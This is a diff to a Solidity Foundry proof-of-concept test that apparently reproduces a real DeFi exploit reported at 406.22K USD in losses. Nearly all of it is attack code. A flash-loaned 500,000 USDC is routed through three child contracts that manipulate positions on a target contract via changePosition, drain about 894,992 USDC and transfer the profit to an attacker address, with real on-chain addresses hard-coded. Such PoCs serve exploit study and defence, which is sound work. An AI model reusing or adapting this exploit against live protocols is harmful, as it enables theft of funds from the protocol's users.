@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.20;
 
-import {Test, console2} from "forge-std/Test.sol";
 import "./Base.sol";
 
 // @KeyInfo - Total Lost : 406.22K USD
@@ -39,13 +38,17 @@ contract AttackTest is Base {
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-        OurAttack attack = new OurAttack();
+        OurAttack attack = _deployAttack();
         _prepareProfit(attack);
         _logBalances("Before exploit");
         attack.attack{value: TX_VALUE}();
         _logBalances("After exploit");
         vm.stopPrank();
         _assertProfit();
+    }
+
+    function _deployAttack() internal returns (OurAttack attack) {
+        attack = new OurAttack();
     }
 
     function _prepareProfit(OurAttack attack) internal {
@@ -59,13 +62,7 @@ contract AttackTest is Base {
     function _expectProfitLegs(address attack, address attackChild) internal override {
         attack;
         attackChild;
-        _expectProfit(
-            Addresses.InitializableImmutableAdminUpgradeabilityProxy_625E77,
-            address(0),
-            Addresses.USDC_5CC8,
-            "USDC",
-            500250000000
-        );
+        _expectProfit(Addresses.A_625E77_B4CD, address(0), Addresses.USDC_5CC8, "USDC", 500250000000);
         _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC_5CC8, "USDC", 394742852305);
     }
 }
@@ -80,8 +77,8 @@ contract OurAttack {
 
     function attack() public payable {
         attackChild.run();
-        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, 394742852305);
+        uint256 finalUsdcBalance = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
+        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, finalUsdcBalance);
     }
 
     receive() external payable {}
@@ -92,22 +89,8 @@ contract OurAttack {
 }
 
 contract AttackChild {
-    AttackChild_3 public positionChild;
-    AttackChild_1 public zeroPoolChild;
-    AttackChild_2 public smallPositionChild;
-
-    bytes32 private constant FLASH_CALLBACK = keccak256("poc.flash.callback");
-    mapping(bytes32 => bool) private callbackDone;
-
     constructor() payable {
-        positionChild = new AttackChild_3();
-        require(address(positionChild) == Addresses.attack_child_6635, "unexpected attack child");
-
-        zeroPoolChild = new AttackChild_1();
-        require(address(zeroPoolChild) == Addresses.attack_child, "unexpected attack child");
-
-        smallPositionChild = new AttackChild_2();
-        require(address(smallPositionChild) == Addresses.attack_child_7BEB, "unexpected attack child");
+        _deployAttackChild();
     }
 
     receive() external payable {}
@@ -122,17 +105,13 @@ contract AttackChild {
         premium;
         initiator;
         params;
-        if (!callbackDone[FLASH_CALLBACK]) _flashCallback();
+        if (!flashCallbackDone) flashCallback();
         return true;
     }
 
     function run() external payable {
-        IInitializableImmutableAdminUpgradeabilityProxy_794A61(
-                Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61
-            ).flashLoanSimple(Addresses.created_attack_contract_6CB5, Addresses.USDC_5CC8, 500000000000, hex"", 0);
-        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
-        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_path_entry, 394742852305);
+        requestFlashLoan();
+        return;
     }
 
     fallback() external payable {
@@ -140,54 +119,91 @@ contract AttackChild {
     }
 
     function execOp() external payable {
-        if (!callbackDone[FLASH_CALLBACK]) _flashCallback();
+        if (!flashCallbackDone) flashCallback();
     }
 
-    function _flashCallback() internal {
-        callbackDone[FLASH_CALLBACK] = true;
+    bool private flashCallbackDone;
+
+    function flashCallback() internal {
+        flashCallbackDone = true;
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).updateFunding();
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
+        uint256 firstPositionUsdc = 1000000000;
+        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_6635, firstPositionUsdc);
+        AttackChild_3(payable(Addresses.attack_child_6635)).attackChildCb2();
 
-        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_6635, 1000000000);
-        AttackChild_3(payable(Addresses.attack_child_6635)).openPosition();
-
-        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child, 2000000000);
-        AttackChild_1(payable(Addresses.attack_child)).zeroPool();
-
+        uint256 zeroPoolUsdc = 2000000000;
+        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child, zeroPoolUsdc);
+        AttackChild_1(payable(Addresses.attack_child)).attackChildCb();
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
 
-        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_7BEB, 500000000);
-        AttackChild_2(payable(Addresses.attack_child_7BEB)).rebalanceSmall();
-
+        uint256 smallPositionUsdc = 500000000;
+        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_7BEB, smallPositionUsdc);
+        AttackChild_2(payable(Addresses.attack_child_7BEB)).openSmallPosition();
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 496500000000);
+
+        uint256 mainPositionAllowance = 496500000000;
+        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, mainPositionAllowance);
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
-            .changePosition(int256(-68000000000000000000), int256(496500000000), int256(0));
-
-        AttackChild_3(payable(Addresses.attack_child_6635)).drain();
-
+            .changePosition(int256(-68000000000000000000), int256(mainPositionAllowance), int256(0));
+        AttackChild_3(payable(Addresses.attack_child_6635)).attackChildCb3();
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8)
-            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, 500250000000);
+
+        uint256 repaymentAllowance = 500250000000;
+        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_794A61_14AD, repaymentAllowance);
+    }
+
+    function requestFlashLoan() internal {
+        IContract_794A61_14AD(Addresses.A_794A61_14AD)
+            .flashLoanSimple(address(this), Addresses.USDC_5CC8, 500000000000, hex"", 0);
+        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
+        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
+        uint256 returnedUsdc = 394742852305;
+        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_path_entry, returnedUsdc);
+    }
+
+    function _deployAttackChild() public {
+        AttackChild_3 attackChild_3 = new AttackChild_3();
+        require(address(attackChild_3) == Addresses.attack_child_6635, "unexpected attack child");
+        attackChild_3.observeSetup();
+        AttackChild_1 attackChild_1 = new AttackChild_1();
+        require(address(attackChild_1) == Addresses.attack_child, "unexpected attack child");
+        attackChild_1.observeSetup();
+        AttackChild_2 attackChild_2 = new AttackChild_2();
+        require(address(attackChild_2) == Addresses.attack_child_7BEB, "unexpected attack child");
+        attackChild_2.observeSetup();
     }
 }
 
 contract AttackChild_1 {
     receive() external payable {}
 
+    function zeroPool() external payable {
+        executeZeroPool();
+        return;
+    }
+
     fallback() external payable {
         if (msg.data.length == 0) return;
     }
 
-    function zeroPool() public payable {
+    function attackChildCb() external payable {
+        executeZeroPool();
+        return;
+    }
+
+    function executeZeroPool() internal {
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 2000000000);
+        uint256 zeroPoolAllowance = 2000000000;
+        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, zeroPoolAllowance);
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
-            .changePosition(int256(324678582642240534), int256(2000000000), int256(0));
+            .changePosition(int256(324678582642240534), int256(zeroPoolAllowance), int256(0));
     }
+
+    function observeSetup() public {}
 }
 
 contract AttackChild_2 {
@@ -196,49 +212,73 @@ contract AttackChild_2 {
     fallback() external payable {
         if (msg.data.length == 0) return;
         if (msg.sig == 0x7ef540b0) {
-            _smallPosition();
+            openSmallPosition();
             return;
         }
     }
 
-    function rebalanceSmall() external payable {
-        _smallPosition();
+    function openSmallPosition() public payable {
+        executeSmallPosition();
+        return;
     }
 
-    function _smallPosition() internal {
+    function executeSmallPosition() internal {
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 500000000);
+        uint256 smallAllowance = 500000000;
+        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, smallAllowance);
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
-            .changePosition(int256(1000000000000000), int256(500000000), int256(0));
+            .changePosition(int256(1000000000000000), int256(smallAllowance), int256(0));
     }
+
+    function observeSetup() public {}
 }
 
 contract AttackChild_3 {
     receive() external payable {}
 
+    function openPosition() external payable {
+        executeOpenPosition();
+        return;
+    }
+
     function drain() external payable {
-        _drainPosition();
+        executeDrain();
+        return;
     }
 
     fallback() external payable {
         if (msg.data.length == 0) return;
     }
 
-    function openPosition() public payable {
-        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
-        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 1000000000);
-        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
-            .changePosition(int256(100000000000000000), int256(1000000000), int256(0));
+    function attackChildCb2() external payable {
+        executeOpenPosition();
+        return;
     }
 
-    function _drainPosition() internal {
+    function attackChildCb3() external payable {
+        executeDrain();
+        return;
+    }
+
+    function executeOpenPosition() internal {
+        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
+        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
+        uint256 openAllowance = 1000000000;
+        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, openAllowance);
+        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
+            .changePosition(int256(100000000000000000), int256(openAllowance), int256(0));
+    }
+
+    function executeDrain() internal {
         IERC20Like(Addresses.USDC_5CC8).balanceOf(Addresses.A_F7CA73_80BC);
         IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).changePosition(int256(0), int256(-894992852305), int256(0));
         IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
-        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.created_attack_contract_6CB5, 894992852305);
+        uint256 drainedUsdc = 894992852305;
+        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.created_attack_contract_6CB5, drainedUsdc);
     }
+
+    function observeSetup() public {}
 }
 
 library Addresses {
@@ -246,18 +286,16 @@ library Addresses {
     address internal constant USDC = 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8;
     address internal constant attack_path_entry = 0x21EdA2e3ad975Fde9c81769E15Ed8e1532eB08a4;
     address internal constant created_attack_contract_6CB5 = 0x348DF930E825Da25552D8B3dc44e871c67846CB5;
-    address internal constant InitializableImmutableAdminUpgradeabilityProxy_625E77 =
-        0x625E7708f30cA75bfd92586e17077590C60eb4cD;
+    address internal constant A_625E77_B4CD = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;
     address internal constant A_6749D7_6707 = 0x6749D795bb40Ddf00a953f618CEddA7440216707;
-    address internal constant InitializableImmutableAdminUpgradeabilityProxy_794A61 =
-        0x794a61358D6845594F94dc1DB02A252b5b4814aD;
+    address internal constant A_794A61_14AD = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
     address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
     address internal constant RKA = 0x8b194bEae1d3e0788A1a35173978001ACDFba668;
     address internal constant attack_child = 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f;
     address internal constant A_B309BF_AB83 = 0xb309bf4e2747B885D8C3ee2e078E6EAADFcdaB83;
     address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
     address internal constant attacker_eoa = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95;
-    address internal constant UniswapV3Pool = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
+    address internal constant A_C31E54_A443 = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
     address internal constant attack_child_7BEB = 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb;
     address internal constant attack_child_6635 = 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635;
     address internal constant A_F7CA73_80BC = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;
@@ -265,25 +303,12 @@ library Addresses {
     address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
 }
 
+interface IContract_794A61_14AD {
+    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
+}
+
 interface IContract_F7CA73_80BC {
     function changePosition(int256, int256, int256) external;
     function longPosition() external view;
     function updateFunding() external;
-}
-
-interface IInitializableImmutableAdminUpgradeabilityProxy_794A61 {
-    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
-}
-
-interface Icreated_attack_contract_6CB5 {
-    function run() external;
-}
-
-interface Iattack_child {
-    function zeroPool() external;
-}
-
-interface Iattack_child_6635 {
-    function drain() external;
-    function openPosition() external;
 }
